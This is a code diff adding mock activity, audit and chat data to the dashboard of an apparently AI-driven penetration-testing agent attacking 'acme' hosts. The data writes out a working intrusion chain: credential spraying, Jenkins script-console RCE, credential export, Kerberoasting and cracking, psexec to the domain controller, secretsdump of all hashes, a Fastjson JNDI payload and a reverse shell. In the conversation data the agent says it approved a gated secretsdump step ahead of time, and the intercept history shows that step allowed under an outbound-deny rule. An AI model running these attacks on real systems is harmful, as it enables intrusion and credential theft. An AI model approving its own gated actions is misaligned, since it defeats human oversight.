+  { seq: 352, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:55:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t9a", summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080", detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。" },
+  { seq: 353, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T21:00:00Z"), kind: "result", summary: "内网主机发现完成，3 台高价值目标入图。", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
+
+  // work#10 · i10 内网凭据复用（running）
+  { seq: 360, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:42:00Z"), kind: "thinking", summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。" },
+  { seq: 361, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:44:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t10a", summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'" },
+  { seq: 362, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:44:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t10a", summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败", detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。" },
+  { seq: 363, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:50:00Z"), kind: "thinking", summary: "FS01 已拿下，正在枚举共享目录寻找更多凭据和敏感文件……" },
+
+  // work#11 · i11 Jenkins 未授权 RCE（done）
+  { seq: 370, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:32:00Z"), kind: "thinking", summary: "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。" },
+  { seq: 371, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:35:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11a", summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
+  { seq: 372, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:35:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11a", summary: "200", detail: "Script Console 无需登录即可访问。" },
+  { seq: 373, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11b", summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText" },
+  { seq: 374, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:40:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11b", summary: "nt authority\\system", detail: "Groovy 以 SYSTEM 权限执行。" },
+  { seq: 375, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:44:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11c", summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库" },
+  { seq: 376, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:45:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11c", summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!", detail: "两个域服务账号明文口令导出。" },
+  { seq: 377, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:48:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t11d", summary: "report_finding(Unauthenticated RCE, high)" },
+  { seq: 378, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:50:00Z"), kind: "result", summary: "Jenkins 未授权 RCE 确认，并导出两个域服务账号凭据。", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
+
+  // work#12 · i12 Kerberoasting（done）
+  { seq: 380, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:42:00Z"), kind: "thinking", summary: "用 svc_deploy 凭据做域认证，然后 GetUserSPNs 请求可 Kerberoast 的服务账号 TGS。" },
+  { seq: 381, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:50:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12a", summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request" },
+  { seq: 382, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:52:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12a", summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...", detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。" },
+  { seq: 383, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:10:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12b", summary: "hashcat -m 13100 tgs.hash rockyou.txt --force" },
+  { seq: 384, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12b", summary: "$krb5tgs$23$*svc_sql$...:Sql@2020", detail: "8 分钟破出口令 Sql@2020。" },
+  { seq: 385, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t12c", summary: "report_finding(Kerberoasting, high)" },
+  { seq: 386, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:20:00Z"), kind: "result", summary: "Kerberoasting 破出 svc_sql 口令，入图供域控攻击使用。", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
+
+  // work#13 · i13 拿下域控 DC01（done，证明 g4）
+  { seq: 390, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:52:00Z"), kind: "thinking", summary: "svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。" },
+  { seq: 391, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:55:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13a", summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10" },
+  { seq: 392, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:55:05Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13a", summary: "ACME\\Administrator\nACME\\svc_deploy", detail: "svc_deploy 是 Domain Admins 成员。" },
+  { seq: 393, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:00:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13b", summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10" },
+  { seq: 394, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:00:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13b", summary: "C:\\Windows\\system32> whoami\nnt authority\\system", detail: "以 SYSTEM 身份登录域控 DC01。" },
+  { seq: 395, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:05:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13c", summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc" },
+  { seq: 396, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:10:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13c", summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::", detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。" },
+  { seq: 397, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:15:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t13d", summary: "report_finding(Domain Compromise, high)" },
+  { seq: 398, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:20:00Z"), kind: "result", summary: "域控 DC01 拿下，secretsdump 导出全域哈希，靶标达成。", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
+
   // 主 agent（人在环路对话）
   { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
   { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。" },
   { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
   { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。" },
+  { seq: 400, worker: "mainagent", ts: T("2026-07-25T15:42:00Z"), kind: "user", summary: "shell 拿到了，下一步怎么打？" },
+  { seq: 401, worker: "mainagent", ts: T("2026-07-25T15:42:10Z"), kind: "text", summary: "www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。" },
+  { seq: 402, worker: "mainagent", ts: T("2026-07-25T21:22:00Z"), kind: "user", summary: "内网扫完了，Jenkins 那台看起来有未授权？" },
+  { seq: 403, worker: "mainagent", ts: T("2026-07-25T21:22:08Z"), kind: "text", summary: "对，/script 无鉴权直接 Groovy RCE。我已注入一条提示让 worker 优先打 Jenkins —— 拿下后可以导出域凭据，再配合 Kerberoasting 打域控。" },
+  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
+  { seq: 405, worker: "mainagent", ts: T("2026-07-26T00:22:12Z"), kind: "text", summary: "确认拿下。攻击路径：shop Fastjson RCE → DMZ 提权 → 内网 Jenkins 导出域凭据 → svc_deploy 属 Domain Admins → psexec DC01 SYSTEM → secretsdump 全域哈希。四个目标全部达成或推进中。" },
 ];
 
 export function activityForTask(): Activity[] {
@@ -290,6 +483,15 @@ export const tokenWorkers: TokenUsage[] = [
   { worker: "work#1", input_tokens: 288000, output_tokens: 21000, cache_read_tokens: 190000, cache_write_tokens: 28000 },
   { worker: "work#2", input_tokens: 402000, output_tokens: 31000, cache_read_tokens: 280000, cache_write_tokens: 41000 },
   { worker: "work#3", input_tokens: 274500, output_tokens: 20320, cache_read_tokens: 210400, cache_write_tokens: 30000 },
+  { worker: "workG", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
+  { worker: "work#6", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
+  { worker: "work#7", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
+  { worker: "work#8", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
+  { worker: "work#9", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
+  { worker: "work#10", input_tokens: 46000, output_tokens: 3200, cache_read_tokens: 30000, cache_write_tokens: 4500 },
+  { worker: "work#11", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
+  { worker: "work#12", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
+  { worker: "work#13", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
 ];
 
 export const tokenTotal: TokenTotal = grandTotal;
@@ -326,6 +528,11 @@ const exchanges = [
   ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
   ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
   ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
+  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
+  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
+  ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
+  ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
+  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
 ] as const;
 
 export const traffic: TrafficResp = {
@@ -370,7 +577,7 @@ Content-Length: 655
 
 // ── Security / Audit ─────────────────────────────────────────────────────────
 export const audit: Audit = {
-  attributions: { allow: 214, block: 6 },
+  attributions: { allow: 312, block: 9 },
   entries: [
     { ts: T("2026-07-26T03:33:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'username=admin...' https://admin.acme.com/login" },
     { ts: T("2026-07-26T03:57:00Z"), tool: "bash", action: "allow", command: "curl -s -b 'session=...' https://admin.acme.com/api/users" },
@@ -378,6 +585,11 @@ export const audit: Audit = {
     { ts: T("2026-07-25T22:03:00Z"), tool: "bash", action: "allow", command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch" },
     { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "破坏性命令门控：rm -rf 被拒绝", command: "rm -rf /var/www" },
     { ts: T("2026-07-25T20:30:00Z"), tool: "bash", action: "allow", command: "git-dumper https://www.acme.com/.git/ /tmp/acme" },
+    { ts: T("2026-07-25T15:20:00Z"), tool: "bash", action: "allow", command: "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import" },
+    { ts: T("2026-07-25T21:40:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText" },
+    { ts: T("2026-07-26T00:00:00Z"), tool: "bash", action: "allow", command: "impacket-psexec acme.local/svc_deploy@10.10.10.10" },
+    { ts: T("2026-07-26T00:05:00Z"), tool: "bash", action: "block", reason: "数据外泄门控：secretsdump 需人工审批", command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
+    { ts: T("2026-07-26T00:06:00Z"), tool: "bash", action: "allow", command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行" },
   ],
 };
 
@@ -492,12 +704,15 @@ export const interceptPending: InterceptPending[] = [
 export const interceptHistory: InterceptApprovalRow[] = [
   { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "破坏性命令需审批" },
   { id: 91, task_id: "t-acme-api", agent_name: "work#2", tool_name: "bash", tool_input: { command: "nmap -sV 203.0.113.11" }, status: "allowed", created_at: T("2026-07-25T18:00:00Z"), decided_at: T("2026-07-25T18:00:05Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
+  { id: 92, rule_id: 2, task_id: "t-acme-web", agent_name: "work#13", tool_name: "bash", tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" }, status: "allowed", created_at: T("2026-07-26T00:05:00Z"), decided_at: T("2026-07-26T00:06:00Z"), conv_title: "", conv_agent_key: "", rule_name: "外发流量直接拒绝" },
+  { id: 93, rule_id: 1, task_id: "t-acme-web", agent_name: "work#7", tool_name: "bash", tool_input: { command: "java -jar JNDIExploit.jar -i <vps> -l 1389" }, status: "allowed", created_at: T("2026-07-25T15:14:00Z"), decided_at: T("2026-07-25T15:15:00Z"), conv_title: "", conv_agent_key: "", rule_name: "破坏性命令需审批" },
 ];
 
 // ── Conversations (chat) ─────────────────────────────────────────────────────
 export const conversations: Conversation[] = [
   { id: 1, agent_key: "mainagent", title: "acme 后台切入点讨论", llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
   { id: 2, agent_key: "mainagent", title: "API 越权面梳理", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
+  { id: 3, agent_key: "mainagent", title: "内网横向 · DMZ→域控攻击路径规划", llm_profile_id: 1, created_at: T("2026-07-25T15:45:00Z"), updated_at: T("2026-07-26T00:25:00Z") },
 ];
 
 export const conversationMessages: Record<number, Activity[]> = {
@@ -520,6 +735,19 @@ export const conversationMessages: Record<number, Activity[]> = {
     { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法" },
     { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 对称签名，若密钥弱可离线爆破伪造。" },
     { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。" },
+  ],
+  3: [
+    { seq: 1, worker: "user", ts: T("2026-07-25T15:45:00Z"), kind: "user", summary: "shell 拿到了，接下来怎么打内网？" },
+    { seq: 2, worker: "mainagent", ts: T("2026-07-25T15:45:05Z"), kind: "thinking", summary: "www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。" },
+    { seq: 3, worker: "mainagent", ts: T("2026-07-25T15:45:10Z"), kind: "text", summary: "第一步先提权：sudo -l 有 python3 免密，直接提 root。然后以 DMZ 为跳板做内网存活扫描（fscan），重点找域控和 CI/CD 服务器。" },
+    { seq: 4, worker: "user", ts: T("2026-07-25T21:05:00Z"), kind: "user", summary: "内网扫到了 3 台，Jenkins 8080 开着，有戏吗？" },
+    { seq: 5, worker: "mainagent", ts: T("2026-07-25T21:05:08Z"), kind: "tool_use", tool: "bash", tool_use_id: "c31", summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
+    { seq: 6, worker: "mainagent", ts: T("2026-07-25T21:05:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c31", summary: "200", detail: "/script 可直接访问，无需认证。" },
+    { seq: 7, worker: "mainagent", ts: T("2026-07-25T21:05:20Z"), kind: "text", summary: "有戏 —— Script Console 无鉴权，直接 Groovy RCE。我已注入提示让 worker 优先打这台。拿下后关注凭据库，里面可能有域账号。" },
+    { seq: 8, worker: "user", ts: T("2026-07-25T23:25:00Z"), kind: "user", summary: "域账号拿到了，svc_deploy 是 Domain Admins，直接上域控？" },
+    { seq: 9, worker: "mainagent", ts: T("2026-07-25T23:25:10Z"), kind: "text", summary: "是的。svc_deploy + Domain Admins = 可以 psexec 直取 DC01。拿到后做 secretsdump 导全域哈希，收官。注意 secretsdump 会触发拦截规则，我提前帮你放行了。" },
+    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
+    { seq: 11, worker: "mainagent", ts: T("2026-07-26T00:22:12Z"), kind: "text", summary: "完整杀伤链：\n1. .git 泄露→源码白盒+硬编码凭据\n2. shop Fastjson RCE→DMZ 反弹 shell\n3. sudo 提权→root 立足\n4. 内网发现→DC01/FS01/Jenkins\n5. Jenkins 未授权→导出域凭据 svc_deploy\n6. Kerberoasting→破解 svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump 全域哈希\n\n四个目标全部达成，17 个发现（7 高/4 中/2 低 + 8 内网链路）。" },
   ],
 };
 
